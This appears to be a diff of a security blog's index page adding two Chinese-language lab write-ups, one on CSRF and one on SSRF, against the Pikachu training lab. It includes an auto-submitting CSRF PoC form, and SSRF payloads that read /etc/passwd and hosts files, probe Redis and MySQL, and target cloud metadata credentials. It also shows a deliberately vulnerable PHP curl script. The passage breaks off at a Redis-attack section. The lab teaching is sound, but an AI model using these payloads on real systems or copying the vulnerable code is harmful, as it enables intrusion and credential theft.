@@ -176,18 +176,18 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">18</span>
+          <span class="site-state-item-count">21</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
           <a href="/categories/">
-        <span class="site-state-item-count">15</span>
+        <span class="site-state-item-count">19</span>
         <span class="site-state-item-name">categories</span></a>
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">95</span>
+        <span class="site-state-item-count">116</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
@@ -212,6 +212,1084 @@
     </div>
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://byroins.github.io/2026/08/08/web-security/csrf/2026-08-08-csrf/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/private/icon1.png">
+      <meta itemprop="name" content="Byron">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Byron">
+      <meta itemprop="description" content="Documenting vulnerability reproduction, SRC bug bounty write-ups, and custom penetration testing tools.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Byron">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2026/08/08/web-security/csrf/2026-08-08-csrf/" class="post-title-link" itemprop="url">CSRF</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2026-08-08 22:00:00" itemprop="dateCreated datePublished" datetime="2026-08-08T22:00:00+08:00">2026-08-08</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2026-09-02 22:11:01" itemprop="dateModified" datetime="2026-09-02T22:11:01+08:00">2026-09-02</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/web-security/" itemprop="url" rel="index"><span itemprop="name">web-security</span></a>
+        </span>
+          , 
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/web-security/csrf/" itemprop="url" rel="index"><span itemprop="name">csrf</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <blockquote>
+<p>Environment: PHP 5.2.17 + MySQL 5.7.26<br>Lab: Pikachu</p>
+</blockquote>
+<hr>
+<h2 id="1-0-CSRF-跨站请求伪造"><a href="#1-0-CSRF-跨站请求伪造" class="headerlink" title="1.0 CSRF (跨站请求伪造)"></a>1.0 CSRF (跨站请求伪造)</h2><h4 id="01-定义"><a href="#01-定义" class="headerlink" title="01 定义:"></a>01 定义:</h4><p>CSRF, 攻击者诱导已登录的用户在不知情情况下执行非本意操作, 完成恶意请求</p>
+<ul>
+<li>利用 Web 应用的<strong>身份验证机制</strong>和<strong>会话管理机制</strong>的固有缺陷:<ul>
+<li>服务器无法区分请求是<strong>用户主动发起</strong>, 或<strong>用户被动触发</strong></li>
+<li>请求携带有效的 Session Cookie, 服务器认为”合法”</li>
+</ul>
+</li>
+</ul>
+<h4 id="02-漏洞成因"><a href="#02-漏洞成因" class="headerlink" title="02 漏洞成因"></a>02 漏洞成因</h4><ul>
+<li>浏览器会自动携带目标站点Cookie发起跨站请求, 服务端仅靠Cookie&#x2F;Session做身份校验, 不能保证请求是否由用户本人主动发起.</li>
+<li>常见缺失防御:<ul>
+<li>未校验 CSRF-Token;</li>
+<li>未校验 Referer &#x2F; Origin 请求头;</li>
+<li>关键业务接口无二次身份校验.</li>
+</ul>
+</li>
+</ul>
+<h4 id="03-攻击流程"><a href="#03-攻击流程" class="headerlink" title="03 攻击流程"></a>03 攻击流程</h4><blockquote>
+<p>以下 CSRF 攻击链逻辑图解</p>
+</blockquote>
+<p><img data-src="/2026/08/08/web-security/csrf/2026-08-08-csrf/1.png"></p>
+<h4 id="04-CSRF-三要素"><a href="#04-CSRF-三要素" class="headerlink" title="04 CSRF 三要素"></a>04 CSRF 三要素</h4><ul>
+<li><strong>目标操作:</strong> 存在可被请求直接触发的业务接口(修改信息, 转账, 修改密码)</li>
+<li><strong>会话依赖Cookie:</strong> 浏览器自动带上Cookie, 服务端仅凭Cookie识别用户身份</li>
+<li><strong>请求参数可控:</strong> 接口请求参数可被攻击者完全预知, 构造, 无随机不可预测的校验 <code>Token</code></li>
+</ul>
+<blockquote>
+<p>注意: CSRF不能获取 Cookie, 不能读取响应, 只能借用受害者身份执行操作.</p>
+</blockquote>
+<hr>
+<h3 id="1-1-同源策略"><a href="#1-1-同源策略" class="headerlink" title="1.1 同源策略"></a>1.1 同源策略</h3><h4 id="01-定义-1"><a href="#01-定义-1" class="headerlink" title="01 定义:"></a>01 定义:</h4><p><code>同源策略</code>指在 web 浏览器中, 允许某个网页脚本访问另一个网页的数据, 但前提是两个网页必须同源, 不同源的客户端脚本在没有明确授权的情况下, 不能读写对方的资源, 如<code>Cookie</code>, <code>同源策略</code> 是浏览器安全模型, W3C标准规范</p>
+<ul>
+<li>web应用程序广泛依赖于<code>Cookie</code>维持会话, 所以必须将不相关网站严格分隔, 防止数据泄露</li>
+</ul>
+<h4 id="02-案例"><a href="#02-案例" class="headerlink" title="02 案例"></a>02 案例</h4><p><code>同源策略</code> 需要对比两者<code>域名(host)</code>, <code>端口</code>, <code>协议</code>, 三者完全相同即同源.</p>
+<p>案例: 与<code>http://www.example.com/index/index.php</code>比较</p>
+<table>
+<thead>
+<tr>
+<th>源</th>
+<th>是否同源</th>
+<th>原因</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><a target="_blank" rel="noopener" href="http://test.example.com/admin/index.php">http://test.example.com/admin/index.php</a></td>
+<td>否</td>
+<td>域名不同</td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="https://test.example.com/admin/index.php">https://test.example.com/admin/index.php</a></td>
+<td>否</td>
+<td>协议不同</td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="http://test.example.com:8080/admin/index.php">http://test.example.com:8080/admin/index.php</a></td>
+<td>否</td>
+<td>端口不同</td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="http://www.example.com/test/index.php">http://www.example.com/test/index.php</a></td>
+<td>是</td>
+<td>同源策略</td>
+</tr>
+</tbody></table>
+<h4 id="03-核心"><a href="#03-核心" class="headerlink" title="03 核心"></a>03 核心</h4><ul>
+<li>同源策略不会阻止<code>表单</code>, <code>img</code> , <code>script</code>, <code>iframe</code>, <code>link</code>等标签发起跨站请求, 只阻止 JS 读取跨站返回结果, 这正是CSRF 能够生效的底层原理: 浏览器可以跨域发请求, 自动带上 Cookie, 只是 JS 拿不到返回包</li>
+</ul>
+<hr>
+<h2 id="2-0-CSRF-实战"><a href="#2-0-CSRF-实战" class="headerlink" title="2.0 CSRF 实战"></a>2.0 CSRF 实战</h2><blockquote>
+<p>以下实战基于Pikachu靶场</p>
+<p>原理: 构造完整带参数 URL, 诱导登录用户点击链接即可触发</p>
+</blockquote>
+<h4 id="Case-1-GET型CSRF"><a href="#Case-1-GET型CSRF" class="headerlink" title="Case 1: GET型CSRF"></a>Case 1: GET型CSRF</h4><p>01 根据靶场提示, 选取两个用户, 做如下设计</p>
+<ul>
+<li>vince 作为受害者</li>
+<li>allen 作为攻击者</li>
+<li>Chrome 作为受害者浏览器</li>
+<li>BurpSuite内置浏览器作为攻击者浏览器</li>
+</ul>
+<p><img data-src="/2026/08/08/web-security/csrf/2026-08-08-csrf/2.png"></p>
+<p>02 分别登录vince, allen</p>
+<p>03 allen账户选择<code>修改个人信息</code>, BurpSuite抓包</p>
+<p><img data-src="/2026/08/08/web-security/csrf/2026-08-08-csrf/3.png"></p>
+<blockquote>
+<p>获取到修改用户信息数据包, 并且以GET传递</p>
+</blockquote>
+<p>04 将请求构造成可访问URL</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/pikachu/vul/csrf/csrfget/csrf_get_edit.php?sex=%E7%94%B7&amp;phonenum=18888888888&amp;add=USA&amp;email=123%40123.com&amp;submit=submit</span><br></pre></td></tr></table></figure>
+
+<p>05 使用受害者浏览器访问该URL</p>
+<p><img data-src="/2026/08/08/web-security/csrf/2026-08-08-csrf/4.png"></p>
+<blockquote>
+<p>成功将vince用户个人信息修改为攻击者构造的信息</p>
+</blockquote>
+<hr>
+<h4 id="Case-2-POST型CSRF"><a href="#Case-2-POST型CSRF" class="headerlink" title="Case 2: POST型CSRF"></a>Case 2: POST型CSRF</h4><p>01 初始化靶场</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/pikachu/install.php</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>案例设计依旧采用Case 1</p>
+</blockquote>
+<p><img data-src="/2026/08/08/web-security/csrf/2026-08-08-csrf/5.png"></p>
+<p>02 攻击者账户修改个人信息</p>
+<ul>
+<li><p>获取到数据包</p>
+</li>
+<li><p>针对数据包构造CSRF_POC</p>
+<p><img data-src="/2026/08/08/web-security/csrf/2026-08-08-csrf/6.png"></p>
+</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://127.0.0.1/pikachu/vul/csrf/csrfpost/csrf_post_edit.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">value</span>=<span class="string">&quot;ç<span class="symbol">&amp;#148;</span><span class="symbol">&amp;#183;</span>&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;phonenum&quot;</span> <span class="attr">value</span>=<span class="string">&quot;18888888888&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;add&quot;</span> <span class="attr">value</span>=<span class="string">&quot;UAS&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123<span class="symbol">&amp;#64;</span>123<span class="symbol">&amp;#46;</span>com&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit request&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      history.<span class="title function_">pushState</span>(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;/&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">document</span>.<span class="property">forms</span>[<span class="number">0</span>].<span class="title function_">submit</span>();</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>POST‑CSRF 不需要 JS 跨域, 普通 HTML 表单即可完成跨站 POST 提交, 浏览器自动携带 Cookie, 同源策略不拦截表单提交</p>
+</blockquote>
+<p>03 将POC保存为<code>poc.html</code>, 模拟受害者账户访问</p>
+<p><img data-src="/2026/08/08/web-security/csrf/2026-08-08-csrf/7.png"></p>
+<blockquote>
+<p>成功将vince用户个人信息修改为攻击者构造的信息</p>
+</blockquote>
+<hr>
+<h2 id="3-0-CSRF-防御"><a href="#3-0-CSRF-防御" class="headerlink" title="3.0 CSRF 防御"></a>3.0 CSRF 防御</h2><table>
+<thead>
+<tr>
+<th>防御</th>
+<th>说明</th>
+<th>注意点</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>CSRF‑Token</td>
+<td>表单 &#x2F; 请求携带随机不可预测 Token, 后端校验</td>
+<td>Token 不能放在 Cookie 中, 应放在表单隐藏域 &#x2F; 请求头; 每个会话随机生成</td>
+</tr>
+<tr>
+<td>Origin &#x2F; Referer 校验</td>
+<td>判断请求来源域名是否为可信域名</td>
+<td>Referer 可被伪造, 部分浏览器 &#x2F; 代理会丢弃 Referer, 只能作为辅助, 不能当唯一防御</td>
+</tr>
+<tr>
+<td>关键操作二次验证</td>
+<td>修改密码, 转账等高危操作增加验证码, 密码确认</td>
+<td>业务层</td>
+</tr>
+</tbody></table>
+<hr>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://byroins.github.io/2026/08/07/web-security/ssrf/2026-08-07-ssrf/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/private/icon1.png">
+      <meta itemprop="name" content="Byron">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Byron">
+      <meta itemprop="description" content="Documenting vulnerability reproduction, SRC bug bounty write-ups, and custom penetration testing tools.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Byron">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2026/08/07/web-security/ssrf/2026-08-07-ssrf/" class="post-title-link" itemprop="url">SSRF</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2026-08-07 22:00:00" itemprop="dateCreated datePublished" datetime="2026-08-07T22:00:00+08:00">2026-08-07</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2026-09-02 15:48:30" itemprop="dateModified" datetime="2026-09-02T15:48:30+08:00">2026-09-02</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/web-security/" itemprop="url" rel="index"><span itemprop="name">web-security</span></a>
+        </span>
+          , 
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/web-security/ssrf/" itemprop="url" rel="index"><span itemprop="name">ssrf</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <blockquote>
+<p>Environment: PHP 7.3.4 + MySQL 5.7.26<br>Lab: Pikachu</p>
+</blockquote>
+<h2 id="1-0-SSRF-服务端请求伪造"><a href="#1-0-SSRF-服务端请求伪造" class="headerlink" title="1.0 SSRF (服务端请求伪造)"></a>1.0 SSRF (服务端请求伪造)</h2><h3 id="1-1-基础"><a href="#1-1-基础" class="headerlink" title="1.1 基础"></a>1.1 基础</h3><ul>
+<li><p>客户端请求:</p>
+<p>由客户端设备(个人计算机, 手机, 平板电脑) 或软件 (浏览器, 各种APP) 发出的请求, 以获取指定的网页, 图片, 视频或其他资源, 例: 用户在浏览器输入URL或点击链接时, 浏览器会自动发起HTTP请求, 请求服务器返回指定资源.</p>
+</li>
+<li><p>服务端请求</p>
+<p>服务器应用程序或服务会提供功能接口, 比如API接口, 用于与其他服务进行数据交互, 这些由服务器之间的请求称之为服务端请求.</p>
+</li>
+</ul>
+<h3 id="1-2-什么是SSRF"><a href="#1-2-什么是SSRF" class="headerlink" title="1.2 什么是SSRF"></a>1.2 什么是SSRF</h3><p><strong>SSRF</strong>(Server-Side Request Forgery, 服务端请求伪造): 服务器在<strong>没有对目标地址做有效过滤</strong>的情况下, 替攻击者向任意地址发起请求, 攻击者相当于把服务器当成了”跳板机”, 攻击者使用受害者服务器应用程序作为代理, 让请求拥有服务器特征.</p>
+<p><strong>SSRF 漏洞核心标准:</strong></p>
+<ul>
+<li><p>请求是否由服务器发起</p>
+</li>
+<li><p>如何判断请求是否由服务器发起?</p>
+<ul>
+<li>有回显: 是否可以探测到内部服务?</li>
+<li>无回显: 由访问IP判断</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<p>以下 SSRF 攻击链逻辑图解</p>
+</blockquote>
+<hr>
+<p><img data-src="/2026/08/07/web-security/ssrf/2026-08-07-ssrf/ssrf.png"></p>
+<hr>
+<h3 id="1-3-漏洞成因"><a href="#1-3-漏洞成因" class="headerlink" title="1.3 漏洞成因"></a>1.3 漏洞成因</h3><p>由于服务端提供从其他服务器应用获取数据的功能, 但又未对目标地址做严格过滤与限制, 导致攻击者可以传入任意地址让后端服务器对其发起请求, 并返回请求数据, 例: 从指定URL获取网页文本内容, 加载指定地址的图片, 下载等…</p>
+<hr>
+<p><img data-src="/2026/08/07/web-security/ssrf/2026-08-07-ssrf/ssrf1.png"></p>
+<hr>
+<h3 id="1-4-漏洞危害"><a href="#1-4-漏洞危害" class="headerlink" title="1.4 漏洞危害"></a>1.4 漏洞危害</h3><ul>
+<li>窃取数据: 攻击者可伪造请求以访问服务器内部网络或云环境中的其他服务或资源</li>
+<li>攻击第三方系统: 攻击者可伪造请求攻击第三方系统, 例: 访问其他组织敏感数据或执行拒绝服务攻击</li>
+<li>内部端口扫描: 攻击者可伪造请求扫描服务器内部端口和服务</li>
+<li>获取指纹: 通过获取 web 应用收集指纹信息</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>危害</th>
+<th>说明</th>
+<th>典型 payload 协议</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>读服务器本地文件</td>
+<td>读 <code>/etc/passwd</code>、<code>win.ini</code></td>
+<td><code>file://</code></td>
+</tr>
+<tr>
+<td>内网端口扫描 &#x2F; 服务探测</td>
+<td>扫存活主机、探测 Redis&#x2F;MySQL</td>
+<td><code>http://</code>、<code>dict://</code></td>
+</tr>
+<tr>
+<td>攻击内网未授权服务</td>
+<td>打 Redis 写 webshell → RCE</td>
+<td><code>gopher://</code></td>
+</tr>
+<tr>
+<td>云凭据窃取</td>
+<td>偷 AWS&#x2F;阿里云 IAM 临时凭据</td>
+<td><code>http://169.254.169.254</code></td>
+</tr>
+</tbody></table>
+<blockquote>
+<p>协议就是 SSRF 的武器库: <code>file</code> 读文件、<code>dict</code> 探服务、<code>gopher</code> 发任意 TCP 字节流(万能)</p>
+</blockquote>
+<hr>
+<h3 id="1-5-漏洞场景"><a href="#1-5-漏洞场景" class="headerlink" title="1.5 漏洞场景"></a>1.5 漏洞场景</h3><p>SSRF 漏洞一般存在于 Web 应用程序中, 应用程序接收来自用户的输入, 将请求转发至其他服务器, 攻击者在输入中注入恶意URL, 使服务器发起未授权请求, 访问敏感内部资源.</p>
+<ul>
+<li>文件上传功能</li>
+<li>图片处理功能</li>
+<li>URL重定向</li>
+<li>API调用</li>
+</ul>
+<hr>
+<h3 id="1-6-常见危险函数"><a href="#1-6-常见危险函数" class="headerlink" title="1.6 常见危险函数"></a>1.6 常见危险函数</h3><table>
+<thead>
+<tr>
+<th>语言</th>
+<th>危险函数</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>PHP</td>
+<td><code>curl()</code>、<code>file_get_contents()</code>、<code>fsockopen()</code>、<code>fopen()</code></td>
+</tr>
+<tr>
+<td>Python</td>
+<td><code>requests()</code>、<code>urllib()</code></td>
+</tr>
+<tr>
+<td>Java</td>
+<td><code>URL.openConnection()</code>、<code>HttpClient()</code></td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th>函数</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>curl_exec()</td>
+<td>执行cURL会话</td>
+</tr>
+<tr>
+<td>file_get_contents()</td>
+<td>获取整个文件</td>
+</tr>
+<tr>
+<td>fsockopen()</td>
+<td>打开一个网络连接或者一个Unix套接字连接</td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th>协议</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>file:&#x2F;&#x2F;</td>
+<td>查看文件</td>
+</tr>
+<tr>
+<td>dict:&#x2F;&#x2F;</td>
+<td>探测端口</td>
+</tr>
+<tr>
+<td>gopher:&#x2F;&#x2F;</td>
+<td>发送任意 TCP 原始字节流<br>可打 Redis&#x2F;MySQL&#x2F;FastCGI 写 webshell, 进而 RCE</td>
+</tr>
+</tbody></table>
+<hr>
+<h3 id="1-7-漏洞分类"><a href="#1-7-漏洞分类" class="headerlink" title="1.7 漏洞分类"></a>1.7 漏洞分类</h3><ul>
+<li>有回显SSRF: 内网响应直接返回给攻击者</li>
+<li>无回显SSRF(Blind): 无回显, 需要 DNSLog &#x2F; 时间差等侧信道确认和利用</li>
+</ul>
+<hr>
+<h3 id="2-0-漏洞利用"><a href="#2-0-漏洞利用" class="headerlink" title="2.0 漏洞利用"></a>2.0 漏洞利用</h3><h4 id="2-1-Pass-01-本地编写测试"><a href="#2-1-Pass-01-本地编写测试" class="headerlink" title="2.1 Pass-01-本地编写测试"></a>2.1 Pass-01-本地编写测试</h4><p><code>ssrf1.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params"><span class="variable">$url</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">    <span class="comment">// 设置URL及选项</span></span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// 抓取URL并传递给浏览器</span></span><br><span class="line">    <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">    <span class="comment">// 关闭cURL资源, 并释放系统资源</span></span><br><span class="line">    <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">curl</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>http请求类(确认漏洞存在)</p>
+<p><img data-src="/2026/08/07/web-security/ssrf/2026-08-07-ssrf/1.png"></p>
+<blockquote>
+<p>通过Payload<code>?url=http://www.baidu.com</code>成功跳转链接</p>
+</blockquote>
+</li>
+<li><p>本地文件读取(file)</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?url=file:<span class="comment">///c:/windows/win.ini # Windows</span></span><br><span class="line">?url=file:<span class="comment">///etc/passwd         # Linux</span></span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/2026/08/07/web-security/ssrf/2026-08-07-ssrf/2.png"></p>
+<blockquote>
+<p>成功读取到win.ini内容</p>
+</blockquote>
+</li>
+<li><p>探测内网服务(http&#x2F;dict)</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?url=http:<span class="comment">//127.0.0.1:81/            # 访问自己，验证内网可达</span></span><br><span class="line">?url=dict:<span class="comment">//127.0.0.1:6379/info      # 探测 Redis 未授权</span></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>扫描思路: 通过响应差异 &#x2F; 时间差判断端口是否开放</p>
+</blockquote>
+</li>
+</ul>
+<hr>
+<h4 id="2-2-靶场实验"><a href="#2-2-靶场实验" class="headerlink" title="2.2 靶场实验"></a>2.2 靶场实验</h4><ul>
+<li><p>端口探测(curl)</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=dict:<span class="comment">//127.0.0.1:3306</span></span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/2026/08/07/web-security/ssrf/2026-08-07-ssrf/3.png"></p>
+<blockquote>
+<p>探测到mysql端口开放</p>
+</blockquote>
+</li>
+<li><p>读取本机hosts文件(curl)</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=file:<span class="comment">///c:/windows/system32/drivers/etc/hosts</span></span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/2026/08/07/web-security/ssrf/2026-08-07-ssrf/4.png"></p>
+</li>
+<li><p>文件读取(file_get_contents)</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=file:<span class="comment">//c:/windows/system32/drivers/etc/hosts</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>通过php伪协议读取源码(file_get_contents)</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php:<span class="comment">//filter/read=convert.base64-encode/resource=ssrf.php</span></span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/2026/08/07/web-security/ssrf/2026-08-07-ssrf/5.png"></p>
+<blockquote>
+<p>解码后与源码一致, 成功读取</p>
+</blockquote>
+</li>
+</ul>
+<hr>
+<h4 id="2-3-云平台-SSRF-漏洞"><a href="#2-3-云平台-SSRF-漏洞" class="headerlink" title="2.3 云平台 SSRF 漏洞"></a>2.3 云平台 SSRF 漏洞</h4><ul>
+<li><p>云平台服务器从物理层隔绝内网服务, 如何打出危害?</p>
+<p>通过<code>云元数据</code> <code>[meta data]</code>打出危害.</p>
+<p>01 各云服务商均拥有服务器<code>云元数据地址</code></p>
+<p>02 通过地址获取元数据密钥等敏感信息</p>
+</li>
+</ul>
+<hr>
+<h3 id="3-0-漏洞利用进阶"><a href="#3-0-漏洞利用进阶" class="headerlink" title="3.0 漏洞利用进阶"></a>3.0 漏洞利用进阶</h3><h4 id="3-1-内网应用攻击"><a href="#3-1-内网应用攻击" class="headerlink" title="3.1 内网应用攻击"></a>3.1 内网应用攻击</h4><h5 id="01-通过dict-协议攻击内网Redis"><a href="#01-通过dict-协议攻击内网Redis" class="headerlink" title="01 通过dict:// 协议攻击内网Redis"></a>01 通过<code>dict://</code> 协议攻击内网<code>Redis</code></h5><ul>
+<li>Redis端口若未开启认证, 可导致任意用户利用ssrf漏洞攻击内网未授权Redis, 读取Redis数据</li>
+<li>若运行Redis的用户是root, 攻击者可写定时任务进行<code>反弹shell</code></li>
+</ul>
+<p>探测内网服务:</p>
+<ul>
